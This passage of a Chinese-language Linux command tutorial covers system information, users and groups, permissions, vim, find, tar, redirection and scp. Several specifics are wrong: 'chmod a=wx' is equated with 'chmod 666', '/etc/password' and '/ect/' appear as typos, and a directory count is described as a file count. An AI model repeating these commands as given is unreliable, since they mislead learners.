UTC</span> 2018</span><br><span class="line"></span><br><span class="line">3、查看当前操作系统发行版信息<span class="title"></span></span><br><span class="line"><span class="title">cat</span> /etc/issue 或<span class="title"> cat</span> /etc/redhat-release</span><br><span class="line">$<span class="title"> cat</span> /etc/issue</span><br><span class="line">\S<span class="title"></span></span><br><span class="line"><span class="title">Kernel</span> \r<span class="title"> on</span> an \m</span><br><span class="line"></span><br><span class="line">$<span class="title"> cat</span> /etc/redhat-release<span class="title"></span></span><br><span class="line"><span class="title">CentOS</span> Linux<span class="title"> release</span> 7.4.1708 (Core)</span><br><span class="line"></span><br><span class="line">4、查看cpu相关信息，包括型号、主频、内核信息等<span class="title"></span></span><br><span class="line"><span class="title">cat</span> /<span class="keyword">proc</span>/cpuinfo</span><br><span class="line">$<span class="title"> cat</span> /<span class="keyword">proc</span>/cpuinfo<span class="title"></span></span><br><span class="line"><span class="title">processor</span> : 0<span class="title"></span></span><br><span class="line"><span class="title">vendor_id</span> :<span class="title"> GenuineIntel</span></span><br><span class="line">cpu<span class="title"> family</span> : 6<span class="title"></span></span><br><span class="line"><span class="title">model</span> : 45<span class="title"></span></span><br><span class="line"><span class="title">model</span> name :<span class="title"> Intel®</span> Xeon®<span class="title"> CPU</span> E5-2660 0 @ 2.20GHz<span class="title"></span></span><br><span class="line"><span class="title">stepping</span> : 7<span class="title"></span></span><br><span class="line"><span class="title">microcode</span> : 0xffffffff<span class="title"></span></span><br><span class="line"><span class="title">cpu</span> MHz : 2199.998<span class="title"></span></span><br><span class="line"><span class="title">cache</span> size : 20480<span class="title"> KB</span></span><br><span class="line">physical<span class="title"> id</span> : 0<span class="title"></span></span><br><span class="line"><span class="title">siblings</span> : 2<span class="title"></span></span><br><span class="line"><span class="title">core</span> id : 0<span class="title"></span></span><br><span class="line"><span class="title">cpu</span> cores : 2<span class="title"></span></span><br><span class="line"><span class="title">apicid</span> : 0<span class="title"></span></span><br><span class="line"><span class="title">initial</span> apicid : 0<span class="title"></span></span><br><span class="line"><span class="title">fpu</span> :<span class="title"> yes</span></span><br><span class="line">fpu_exception :<span class="title"> yes</span></span><br><span class="line">cpuid<span class="title"> level</span> : 13<span class="title"></span></span><br><span class="line"><span class="title">wp</span> :<span class="title"> yes</span></span><br><span class="line">flags :<span class="title"> fpu</span> vme<span class="title"> de</span> pse<span class="title"> tsc</span> msr<span class="title"> pae</span> mce<span class="title"> cx8</span> apic<span class="title"> sep</span> mtrr<span class="title"> pge</span> mca<span class="title"> cmov</span> pat<span class="title"> pse36</span> clflush<span class="title"> mmx</span> fxsr<span class="title"> sse</span> sse2<span class="title"> ss</span> ht<span class="title"> syscall</span> nx<span class="title"> pdpe1gb</span> rdtscp<span class="title"> lm</span> constant_tsc<span class="title"> rep_good</span> nopl<span class="title"> xtopology</span> eagerfpu<span class="title"> pni</span> pclmulqdq<span class="title"> ssse3</span> cx16<span class="title"> sse4_1</span> sse4_2<span class="title"> popcnt</span> aes<span class="title"> xsave</span> avx<span class="title"> hypervisor</span> lahf_lm<span class="title"> xsaveopt</span></span><br><span class="line">bogomips : 4399.99<span class="title"></span></span><br><span class="line"><span class="title">clflush</span> size : 64<span class="title"></span></span><br><span class="line"><span class="title">cache_alignment</span> : 64<span class="title"></span></span><br><span class="line"><span class="title">address</span> sizes : 44<span class="title"> bits</span> physical, 48<span class="title"> bits</span> virtual<span class="title"></span></span><br><span class="line"><span class="title">power</span> management:<span class="title"></span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">processor</span> : 1<span class="title"></span></span><br><span class="line"><span class="title">vendor_id</span> :<span class="title"> GenuineIntel</span></span><br><span class="line">cpu<span class="title"> family</span> : 6<span class="title"></span></span><br><span class="line"><span class="title">model</span> : 45<span class="title"></span></span><br><span class="line"><span class="title">model</span> name :<span class="title"> Intel®</span> Xeon®<span class="title"> CPU</span> E5-2660 0 @ 2.20GHz<span class="title"></span></span><br><span class="line"><span class="title">stepping</span> : 7<span class="title"></span></span><br><span class="line"><span class="title">microcode</span> : 0xffffffff<span class="title"></span></span><br><span class="line"><span class="title">cpu</span> MHz : 2199.998<span class="title"></span></span><br><span class="line"><span class="title">cache</span> size : 20480<span class="title"> KB</span></span><br><span class="line">physical<span class="title"> id</span> : 0<span class="title"></span></span><br><span class="line"><span class="title">siblings</span> : 2<span class="title"></span></span><br><span class="line"><span class="title">core</span> id : 1<span class="title"></span></span><br><span class="line"><span class="title">cpu</span> cores : 2<span class="title"></span></span><br><span class="line"><span class="title">apicid</span> : 1<span class="title"></span></span><br><span class="line"><span class="title">initial</span> apicid : 1<span class="title"></span></span><br><span class="line"><span class="title">fpu</span> :<span class="title"> yes</span></span><br><span class="line">fpu_exception :<span class="title"> yes</span></span><br><span class="line">cpuid<span class="title"> level</span> : 13<span class="title"></span></span><br><span class="line"><span class="title">wp</span> :<span class="title"> yes</span></span><br><span class="line">flags :<span class="title"> fpu</span> vme<span class="title"> de</span> pse<span class="title"> tsc</span> msr<span class="title"> pae</span> mce<span class="title"> cx8</span> apic<span class="title"> sep</span> mtrr<span class="title"> pge</span> mca<span class="title"> cmov</span> pat<span class="title"> pse36</span> clflush<span class="title"> mmx</span> fxsr<span class="title"> sse</span> sse2<span class="title"> ss</span> ht<span class="title"> syscall</span> nx<span class="title"> pdpe1gb</span> rdtscp<span class="title"> lm</span> constant_tsc<span class="title"> rep_good</span> nopl<span class="title"> xtopology</span> eagerfpu<span class="title"> pni</span> pclmulqdq<span class="title"> ssse3</span> cx16<span class="title"> sse4_1</span> sse4_2<span class="title"> popcnt</span> aes<span class="title"> xsave</span> avx<span class="title"> hypervisor</span> lahf_lm<span class="title"> xsaveopt</span></span><br><span class="line">bogomips : 4399.99<span class="title"></span></span><br><span class="line"><span class="title">clflush</span> size : 64<span class="title"></span></span><br><span class="line"><span class="title">cache_alignment</span> : 64<span class="title"></span></span><br><span class="line"><span class="title">address</span> sizes : 44<span class="title"> bits</span> physical, 48<span class="title"> bits</span> virtual<span class="title"></span></span><br><span class="line"><span class="title">power</span> management:</span><br><span class="line"></span><br><span class="line">5、列出所有版本信息<span class="title"></span></span><br><span class="line"><span class="title">lsb_release</span> -a</span><br><span class="line">$<span class="title"> lsb_release</span> -a</span><br><span class="line">-bash:<span class="title"> lsb_release:</span> command<span class="title"> not</span> found</span><br><span class="line">出现command<span class="title"> not</span> found说明没安装lsb_realease，可以执行命令yum<span class="title"> install</span> -y<span class="title"> redhat-lsb安装lsb_realease，安装完成后，版本信息如下：</span></span><br><span class="line">$<span class="title"> lsb_release</span> -a<span class="title"></span></span><br><span class="line"><span class="title">LSB</span> Version: :core-4.1-amd64:core-4.1-noarch:cxx-4.1-amd64:cxx-4.1-noarch:desktop-4.1-amd64:desktop-4.1-noarch:languages-4.1-amd64:languages-4.1-noarch:printing-4.1-amd64:printing-4.1-noarch<span class="title"></span></span><br><span class="line"><span class="title">Distributor</span> ID:<span class="title"> CentOS</span></span><br><span class="line">Description:<span class="title"> CentOS</span> Linux<span class="title"> release</span> 7.4.1708 (Core)<span class="title"></span></span><br><span class="line"><span class="title">Release:</span> 7.4.1708<span class="title"></span></span><br><span class="line"><span class="title">Codename:</span> Core</span><br></pre></td></tr></table></figure>
<h3 id="用户和组">用户和组</h3>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">添加一个tom用户，设置它属于users组，并添加注释信息</span><br><span class="line">分步完成：useradd tom</span><br><span class="line">          usermod -g users tom</span><br><span class="line">	      usermod -c <span class="string">&quot;hr tom&quot;</span> tom</span><br><span class="line">一步完成：useradd -g users -c <span class="string">&quot;hr tom&quot;</span> tom</span><br><span class="line"></span><br><span class="line">设置tom用户的密码</span><br><span class="line">passwd tom</span><br><span class="line"></span><br><span class="line">修改tom用户的登陆名为tomcat</span><br><span class="line">usermod -l tomcat tom</span><br><span class="line"></span><br><span class="line">将tomcat添加到sys和root组中</span><br><span class="line">usermod -G sys,root tomcat</span><br><span class="line"></span><br><span class="line">查看tomcat的组信息</span><br><span class="line">groups tomcat</span><br><span class="line"></span><br><span class="line">添加一个<span class="keyword">jerry用户并设置密码</span></span><br><span class="line"><span class="keyword"></span>useradd <span class="keyword">jerry</span></span><br><span class="line"><span class="keyword"></span>passwd <span class="keyword">jerry</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line">添加一个名为america的组</span><br><span class="line">groupadd america</span><br><span class="line"></span><br><span class="line">将<span class="keyword">jerry添加到america组中</span></span><br><span class="line"><span class="keyword"></span>usermod -g america <span class="keyword">jerry</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line">将tomcat用户从root组和sys组删除</span><br><span class="line">gpasswd -d tomcat root</span><br><span class="line">gpasswd -d tomcat sys</span><br><span class="line"></span><br><span class="line">将america组名修改为am</span><br><span class="line">groupmod -n am america</span><br><span class="line"><span class="number">12345678910111213141516171819202122232425262728293031323334</span></span><br></pre></td></tr></table></figure>
<h3 id="权限">权限</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">创建a.txt和b.txt文件，将他们设为其拥有者和所在组可写入，但其他以外的人则不可写入:</span><br><span class="line"><span class="built_in">chmod</span> ug+w,o-w a.txt b.txt</span><br><span class="line"></span><br><span class="line">创建c.txt文件所有人都可以写和执行</span><br><span class="line"><span class="built_in">chmod</span> a=wx c.txt 或<span class="built_in">chmod</span> 666 c.txt</span><br><span class="line"></span><br><span class="line">将/hadoop目录下的所有文件与子目录皆设为任何人可读取</span><br><span class="line"><span class="built_in">chmod</span> -R a+r /hadoop</span><br><span class="line"></span><br><span class="line">将/hadoop目录下的所有文件与子目录的拥有者设为root，用户拥有组为<span class="built_in">users</span></span><br><span class="line"><span class="built_in">chown</span> -R root:<span class="built_in">users</span> /hadoop</span><br><span class="line"></span><br><span class="line">将当前目录下的所有文件与子目录的用户皆设为hadoop，组设为<span class="built_in">users</span></span><br><span class="line"><span class="built_in">chown</span> -R hadoop:<span class="built_in">users</span> *</span><br><span class="line">1234567891011121314</span><br></pre></td></tr></table></figure>
<h3 id="帮助文档">帮助文档</h3>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">1.内部命令：echo</span><br><span class="line">查看内部命令帮助：<span class="keyword">help</span> echo 或者 <span class="keyword">man</span> echo</span><br><span class="line"></span><br><span class="line">2.外部命令：<span class="keyword">ls</span></span><br><span class="line">查看外部命令帮助：<span class="keyword">ls</span> --<span class="keyword">help</span> 或者 <span class="keyword">man</span> <span class="keyword">ls</span> 或者 info <span class="keyword">ls</span></span><br><span class="line"></span><br><span class="line">3.<span class="keyword">man</span>文档的类型(1~9)</span><br><span class="line"><span class="keyword">man</span> 7 <span class="keyword">man</span></span><br><span class="line"><span class="keyword">man</span> 5 passwd</span><br><span class="line"></span><br><span class="line">4.快捷键：</span><br><span class="line">ctrl + c：停止进程</span><br><span class="line">ctrl + <span class="keyword">l</span>：清屏</span><br><span class="line">ctrl + r：搜索历史命令</span><br><span class="line">ctrl + q：退出</span><br><span class="line"></span><br><span class="line">5.善于用<span class="keyword">tab</span>键</span><br><span class="line">1234567891011121314151617</span><br></pre></td></tr></table></figure>
<p>文件相关命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.进入到用户根目录</span><br><span class="line"><span class="built_in">cd</span> ~ 或者 <span class="built_in">cd</span></span><br><span class="line"><span class="built_in">cd</span> ~hadoop</span><br><span class="line">回到原来路径</span><br><span class="line"><span class="built_in">cd</span> -</span><br><span class="line"></span><br><span class="line">2.查看文件详情</span><br><span class="line"><span class="built_in">stat</span> a.txt</span><br><span class="line"></span><br><span class="line">3.移动</span><br><span class="line"><span class="built_in">mv</span> a.txt /ect/</span><br><span class="line">改名</span><br><span class="line"><span class="built_in">mv</span> b.txt a.txt</span><br><span class="line">移动并改名</span><br><span class="line"><span class="built_in">mv</span> a.txt ../b.txt</span><br><span class="line"></span><br><span class="line">4拷贝并改名</span><br><span class="line"><span class="built_in">cp</span> a.txt /etc/b.txt</span><br><span class="line"></span><br><span class="line">5.vi撤销修改</span><br><span class="line">ctrl + u (undo)</span><br><span class="line">恢复</span><br><span class="line">ctrl + r (redo)</span><br><span class="line"></span><br><span class="line">6.名令设置别名(重启后无效)</span><br><span class="line"><span class="built_in">alias</span> ll=<span class="string">&quot;ls -l&quot;</span></span><br><span class="line">取消</span><br><span class="line"><span class="built_in">unalias</span> ll</span><br><span class="line"></span><br><span class="line">7.如果想让别名重启后仍然有效需要修改</span><br><span class="line">vi ~/.bashrc</span><br><span class="line"></span><br><span class="line">8.添加用户</span><br><span class="line">useradd hadoop</span><br><span class="line">passwd hadoop</span><br><span class="line"></span><br><span class="line">9创建多个文件</span><br><span class="line"><span class="built_in">touch</span> a.txt b.txt</span><br><span class="line"><span class="built_in">touch</span> /home/&#123;a.txt,b.txt&#125;</span><br><span class="line"></span><br><span class="line">10.将一个文件的内容复制到里另一个文件中</span><br><span class="line"><span class="built_in">cat</span> a.txt &gt; b.txt</span><br><span class="line">追加内容</span><br><span class="line"><span class="built_in">cat</span> a.txt &gt;&gt; b.txt </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">11.将a.txt 与b.txt设为其拥有者和其所属同一个组者可写入，但其他以外的人则不可写入:</span><br><span class="line"><span class="built_in">chmod</span> ug+w,o-w a.txt b.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> a=wx c.txt</span><br><span class="line"></span><br><span class="line">12.将当前目录下的所有文件与子目录皆设为任何人可读取:</span><br><span class="line"><span class="built_in">chmod</span> -R a+r *</span><br><span class="line"></span><br><span class="line">13.将a.txt的用户拥有者设为<span class="built_in">users</span>,组的拥有者设为jessie:</span><br><span class="line"><span class="built_in">chown</span> <span class="built_in">users</span>:jessie a.txt</span><br><span class="line"></span><br><span class="line">14.将当前目录下的所有文件与子目录的用户的使用者为lamport,组拥有者皆设为<span class="built_in">users</span>，</span><br><span class="line"><span class="built_in">chown</span> -R lamport:<span class="built_in">users</span> *</span><br><span class="line"></span><br><span class="line">15.将所有的java语言程式拷贝至finished子目录中:</span><br><span class="line"><span class="built_in">cp</span> *.java finished</span><br><span class="line"></span><br><span class="line">16.将目前目录及其子目录下所有扩展名是java的文件列出来。</span><br><span class="line">find -name <span class="string">&quot;*.java&quot;</span></span><br><span class="line">查找当前目录下扩展名是java 的文件</span><br><span class="line">find -name *.java</span><br><span class="line"></span><br><span class="line">17.删除当前目录下扩展名是java的文件</span><br><span class="line"><span class="built_in">rm</span> -f *.java</span><br><span class="line">12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970</span><br></pre></td></tr></table></figure>
<h3 id="VIM">VIM</h3>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">i</span><br><span class="line">a/A</span><br><span class="line">o/O</span><br><span class="line">r + ?替换</span><br><span class="line"></span><br><span class="line"><span class="section">0:文件当前行的开头</span></span><br><span class="line"><span class="section">$:文件当前行的末尾</span></span><br><span class="line"><span class="section">G:文件的最后一行开头</span></span><br><span class="line">1 + G到第一行 </span><br><span class="line">9 + G到第九行 = :9</span><br><span class="line"></span><br><span class="line"><span class="section">dd:删除一行</span></span><br><span class="line">3dd：删除3行</span><br><span class="line"><span class="section">yy:复制一行</span></span><br><span class="line"><span class="section">3yy:复制3行</span></span><br><span class="line"><span class="section">p:粘贴</span></span><br><span class="line"><span class="section">u:undo</span></span><br><span class="line">ctrl + r:redo</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;a剪切板a</span></span><br><span class="line"><span class="string">&quot;</span>b剪切板b</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;ap粘贴剪切板a的内容</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">每次进入vi就有行号</span></span><br><span class="line"><span class="string">vi ~/.vimrc</span></span><br><span class="line"><span class="string">set nu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">:w a.txt另存为</span></span><br><span class="line"><span class="string">:w &gt;&gt; a.txt内容追加到a.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">:e!恢复到最初状态</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">:1,$s/hadoop/root/g 将第一行到追后一行的hadoop替换为root</span></span><br><span class="line"><span class="string">:1,$s/hadoop/root/c 将第一行到追后一行的hadoop替换为root(有提示)</span></span><br><span class="line"><span class="string">1234567891011121314151617181920212223242526272829303132333435</span></span><br></pre></td></tr></table></figure>
<h3 id="查找">查找</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.查找可执行的命令：</span><br><span class="line"><span class="built_in">which</span> <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">2.查找可执行的命令和帮助的位置：</span><br><span class="line">whereis <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">3.查找文件(需要更新库:updatedb)</span><br><span class="line">locate hadoop.txt</span><br><span class="line"></span><br><span class="line">4.从某个文件夹开始查找</span><br><span class="line">find / -name <span class="string">&quot;hadooop*&quot;</span></span><br><span class="line">find / -name <span class="string">&quot;hadooop*&quot;</span> -<span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">5.查找并删除</span><br><span class="line">find / -name <span class="string">&quot;hadooop*&quot;</span> -ok <span class="built_in">rm</span> &#123;&#125; \;</span><br><span class="line">find / -name <span class="string">&quot;hadooop*&quot;</span> -<span class="built_in">exec</span> <span class="built_in">rm</span> &#123;&#125; \;</span><br><span class="line"></span><br><span class="line">6.查找用户为hadoop的文件</span><br><span class="line">find /usr -user hadoop -<span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">7.查找用户为hadoop并且(-a)拥有组为root的文件</span><br><span class="line">find /usr -user hadoop -a -group root -<span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">8.查找用户为hadoop或者(-o)拥有组为root并且是文件夹类型的文件</span><br><span class="line">find /usr -user hadoop -o -group root -a -<span class="built_in">type</span> d</span><br><span class="line"></span><br><span class="line">9.查找权限为777的文件</span><br><span class="line">find / -perm -777 -<span class="built_in">type</span> d -<span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">10.显示命令历史</span><br><span class="line"><span class="built_in">history</span></span><br><span class="line"></span><br><span class="line">11.grep</span><br><span class="line">grep hadoop /etc/password</span><br><span class="line">12345678910111213141516171819202122232425262728293031323334</span><br></pre></td></tr></table></figure>
<h3 id="打包与压缩">打包与压缩</h3>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.gzip压缩</span><br><span class="line">gzip <span class="selector-tag">a</span><span class="selector-class">.txt</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.解压</span><br><span class="line">gunzip <span class="selector-tag">a</span><span class="selector-class">.txt</span><span class="selector-class">.gz</span></span><br><span class="line">gzip -d <span class="selector-tag">a</span><span class="selector-class">.txt</span><span class="selector-class">.gz</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.bzip2压缩</span><br><span class="line">bzip2 <span class="selector-tag">a</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>.解压</span><br><span class="line">bunzip2 <span class="selector-tag">a</span><span class="selector-class">.bz2</span></span><br><span class="line">bzip2 -d <span class="selector-tag">a</span><span class="selector-class">.bz2</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>.将当前目录的文件打包</span><br><span class="line">tar -cvf bak<span class="selector-class">.tar</span> .</span><br><span class="line">将/etc/password追加文件到bak.tar中(<span class="attribute">r</span>)</span><br><span class="line">tar -rvf bak<span class="selector-class">.tar</span> /etc/password</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>.解压</span><br><span class="line">tar -xvf bak<span class="selector-class">.tar</span></span><br><span class="line"></span><br><span class="line"><span class="number">7</span>.打包并压缩gzip</span><br><span class="line">tar -zcvf <span class="selector-tag">a</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br><span class="line"></span><br><span class="line"><span class="number">8</span>.解压缩</span><br><span class="line">tar -zxvf <span class="selector-tag">a</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br><span class="line">解压到/usr/下</span><br><span class="line">tar -zxvf <span class="selector-tag">a</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span> -C /usr</span><br><span class="line"></span><br><span class="line"><span class="number">9</span>.查看压缩包内容</span><br><span class="line">tar -ztvf <span class="selector-tag">a</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br><span class="line"></span><br><span class="line">zip/unzip</span><br><span class="line"></span><br><span class="line"><span class="number">10</span>.打包并压缩成bz2</span><br><span class="line">tar -jcvf <span class="selector-tag">a</span><span class="selector-class">.tar</span><span class="selector-class">.bz2</span></span><br><span class="line"></span><br><span class="line"><span class="number">11</span>.解压bz2</span><br><span class="line">tar -jxvf <span class="selector-tag">a</span><span class="selector-class">.tar</span><span class="selector-class">.bz2</span></span><br><span class="line"><span class="number">12345678910111213141516171819202122232425262728293031323334353637383940</span></span><br></pre></td></tr></table></figure>
<h3 id="输入输出重定向">输入输出重定向</h3>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.新建一个文件</span><br><span class="line">touch <span class="keyword">a</span>.txt</span><br><span class="line">&gt; <span class="keyword">b</span>.txt</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.错误重定向:<span class="number">2</span>&gt;</span><br><span class="line"><span class="keyword">find</span> /etc -name zhaoxing.txt <span class="number">2</span>&gt; error.txt</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.将正确或错误的信息都输入到<span class="built_in">log</span>.txt中</span><br><span class="line"><span class="keyword">find</span> /etc -name passwd &gt; /tmp/<span class="built_in">log</span>.txt <span class="number">2</span>&gt;&amp;<span class="number">1</span> </span><br><span class="line"><span class="keyword">find</span> /etc -name passwd &amp;&gt; /tmp/<span class="built_in">log</span>.txt</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>.追加&gt;&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>.将小写转为大写（输入重定向）</span><br><span class="line"><span class="keyword">tr</span> <span class="string">&quot;a-z&quot;</span> <span class="string">&quot;A-Z&quot;</span> &lt; /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>.自动创建文件</span><br><span class="line"><span class="keyword">cat</span> &gt; <span class="built_in">log</span>.txt &lt;&lt; EXIT</span><br><span class="line">&gt; ccc</span><br><span class="line">&gt; ddd</span><br><span class="line">&gt; EXI</span><br><span class="line"></span><br><span class="line"><span class="number">7</span>.查看/etc下的文件有多少个？</span><br><span class="line"><span class="keyword">ls</span> -<span class="keyword">l</span> /etc/ | <span class="keyword">grep</span> <span class="string">&#x27;^d&#x27;</span> | wc -<span class="keyword">l</span></span><br><span class="line"></span><br><span class="line"><span class="number">8</span>.查看/etc下的文件有多少个，并将文件详情输入到result.txt中</span><br><span class="line"><span class="keyword">ls</span> -<span class="keyword">l</span> /etc/ | <span class="keyword">grep</span> <span class="string">&#x27;^d&#x27;</span> | tee result.txt | wc -<span class="keyword">l</span></span><br><span class="line"><span class="number">123456789101112131415161718192021222324252627</span></span><br></pre></td></tr></table></figure>
<h3 id="进程控制">进程控制</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.查看用户最近登录情况</span><br><span class="line">last</span><br><span class="line">lastlog</span><br><span class="line"></span><br><span class="line">2.查看硬盘使用情况</span><br><span class="line"><span class="built_in">df</span></span><br><span class="line"></span><br><span class="line">3.查看文件大小</span><br><span class="line"><span class="built_in">du</span></span><br><span class="line"></span><br><span class="line">4.查看内存使用情况</span><br><span class="line">free</span><br><span class="line"></span><br><span class="line">5.查看文件系统</span><br><span class="line">/proc</span><br><span class="line"></span><br><span class="line">6.查看日志</span><br><span class="line"><span class="built_in">ls</span> /var/log/</span><br><span class="line"></span><br><span class="line">7.查看系统报错日志</span><br><span class="line"><span class="built_in">tail</span> /var/log/messages</span><br><span class="line"></span><br><span class="line">8.查看进程</span><br><span class="line">top</span><br><span class="line"></span><br><span class="line">9.结束进程</span><br><span class="line"><span class="built_in">kill</span> 1234</span><br><span class="line"><span class="built_in">kill</span> -9 4333</span><br><span class="line">12345678910111213141516171819202122232425262728</span><br></pre></td></tr></table></figure>
<h3 id="其他命令">其他命令</h3>
<h4 id="远程文件复制：scp">远程文件复制：scp</h4>
<p>scp 命令用于 Linux 之间复制文件和目录，scp是 secure copy 的缩写是linux系统下基于ssh登陆进行安全的远程文件拷贝命令。</p>
<p>scp 是加密的，<a href="https://xiaoxiaoming.xyz/linux/linux-comm-rcp.html">rcp</a> 是不加密的，scp 是 rcp 的加强版。</p>
<p>使用scp命令要确保使用的用户具有可读取远程服务器相应文件的权限，否则scp命令是无法起作用的。</p>
<p>从本地复制到远程命令格式：</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">复制文件</span><br><span class="line">scp local_file remote_username<span class="keyword">@remote</span>_<span class="attribute">ip</span>:remote_folder </span><br><span class="line">或者 </span><br><span class="line">scp local_file remote_username<span class="keyword">@remote</span>_<span class="attribute">ip</span>:remote_file </span><br><span class="line">或者 </span><br><span class="line">scp local_file remote_<span class="attribute">ip</span>:remote_folder </span><br><span class="line">或者 </span><br><span class="line">scp local_file remote_<span class="attribute">ip</span>:remote_file</span><br><span class="line"></span><br><span class="line">复制文件夹</span><br><span class="line">scp -r local_folder remote_username<span class="keyword">@remote</span>_<span class="attribute">ip</span>:remote_folder </span><br><span class="line">或者 </span><br><span class="line">scp -r local_folder remote_<span class="attribute">ip</span>:remote_folder </span><br><span class="line"><span class="number">12345678910111213</span></span><br></pre></td></tr></table></figure>
<p>实例：</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">scp <span class="regexp">/home/</span>space<span class="regexp">/music/</span><span class="number">1</span>.mp3 root<span class="meta">@xiaoxiaoming</span>.xyz:<span class="regexp">/home/</span>root<span class="regexp">/others/</span>music </span><br><span class="line">scp <span class="regexp">/home/</span>space<span class="regexp">/music/</span><span class="number">1</span>.mp3 root<span class="meta">@xiaoxiaoming</span>.xyz:<span class="regexp">/home/</span>root<span class="regexp">/others/</span>music<span class="operator">/</span><span class="number">001</span>.mp3 </span><br><span class="line">scp <span class="regexp">/home/</span>space<span class="regexp">/music/</span><span class="number">1</span>.mp3 xiaoxiaoming.xyz:<span class="regexp">/home/</span>root<span class="regexp">/others/</span>music </span><br><span class="line">scp <span class="regexp">/home/</span>space<span class="regexp">/music/</span><span class="number">1</span>.mp3 xiaoxiaoming.xyz:<span class="regexp">/home/</span>root<span class="regexp">/others/</span>music<span class="operator">/</span><span class="number">001</span>.mp3</span><br><span class="line"></span><br><span class="line">scp <span class="operator">-</span>r <span class="regexp">/home/</span>space<span class="regexp">/music/</span> root<span class="meta">@xiaoxiaoming</span>.xyz:<span class="regexp">/home/</span>root<span class="regexp">/others/</span> </span><br><span class="line">scp <span class="operator">-</span>r <span class="regexp">/home/</span>space<span class="regexp">/music/</span> xiaoxiaoming.xyz:<span class="regexp">/home/</span>root<span class="regexp">/others/</span> </span><br><span class="line"><span class="number">1234567</span></span><br></pre></td></tr></table></figure>
<p>从远程复制到本地：</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">scp root<span class="meta">@xiaoxiaoming</span>.xyz:<span class="regexp">/home/</span>root<span class="regexp">/others/</span>music <span class="regexp">/home/</span>space<span class="regexp">/music/</span><span class="number">1</span>.mp3 </span><br><span class="line">scp <span class="operator">-</span>r xiaoxiaoming.xyz:<span class="regexp">/home/</span>root<span class="regexp">/others/</span> <span class="regexp">/home/</span>space<span class="regexp">/music/</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<p>-P 参数来设置命令的端口号：</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="meta">#scp 命令使用端口号 4588</span></span><br><span class="line">scp -P <span class="number">4588</span> remote<span class="symbol">@xiaoxiaoming</span>.xyz:/usr/<span class="keyword">local</span>/<span class="built_in">sin</span>.sh /home/administrator</span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<h4 id="locate查找">locate查找</h4>
<p>locate命令会去保存文档和目录名称的数据库内，查找文件或目录。</p>
<p>一般情况我们只需要输入<code>locate your_file_name</code> 即可查找指定文件。</p>
<p><strong>参数：</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-d或–database= 配置locate指令使用的数据库。locate指令预设的数据库位于/var/lib/mlocate目录里，文档名为mlocate.db。</p>
</li>
</ul>
<p>查找passwd文件，输入以下命令：</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="keyword">locate</span> passwd</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>locate与find的区别: find 是去硬盘找，locate 只在/var/lib/slocate资料库中找。</p>
<p>locate的速度比find快，它并不是真的查找，而是查数据库，一般文件数据库在/var/lib/mlocate/mlocate.db中，所以locate的查找并不是实时的，而是以数据库的更新为准，一般是系统自己维护，也可以手工升级数据库 ，命令为：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">updatedb</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<h4 id="which命令">which命令</h4>
<p>which查找$PATH中设置命令及安装文件目录所在位置</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">python<span class="variable">@ubuntu</span><span class="symbol">:/var/lib/mlocate</span><span class="variable">$ </span>which locate</span><br><span class="line">/usr/bin/locate</span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<h4 id="echo">echo</h4>
<p>常见用法：</p>
